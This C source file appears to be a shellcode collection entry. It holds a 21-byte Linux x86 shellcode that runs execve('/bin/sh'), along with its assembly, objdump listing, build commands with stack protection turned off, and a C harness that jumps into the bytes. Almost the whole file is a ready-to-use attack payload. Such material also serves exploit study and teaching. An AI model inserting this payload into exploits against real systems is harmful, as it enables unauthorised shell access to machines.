/*
*********
$ INFOS $
*********
Author: vida
Github: https://github.com/vida00/
Command: execve("/bin/sh", NULL, NULL);
Arch: Linux x86
Lenght: 21 bytes

*****************
$ Assembly Code $
*****************
section .text
        global _start
_start:
        xor eax, eax
        mov ecx, eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        mov al, 0xb
        int 0x80

******************
$ objdump result $
******************
08048060 <_start>:
 8048060:       31 c0                   xor    %eax,%eax
 8048062:       89 c1                   mov    %eax,%ecx
 8048064:       50                      push   %eax
 8048065:       68 2f 2f 73 68          push   $0x68732f2f
 804806a:       68 2f 62 69 6e          push   $0x6e69622f
 804806f:       89 e3                   mov    %esp,%ebx
 8048071:       b0 0b                   mov    $0xb,%al
 8048073:       cd 80                   int    $0x80

*****************
$ Compile & Run $
*****************
Assembly: nasm shellcode.asm -f elf32 && ld shellcode.o -o shellcode -m elf_i386
C: gcc shellcode.c -o shellcode -z execstack -m32 && ./shellcode
*/
unsigned char shellcode[] = \
"\x31\xc0\x89\xc1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";
void main(){
    (*(void(*)()) shellcode)();
}
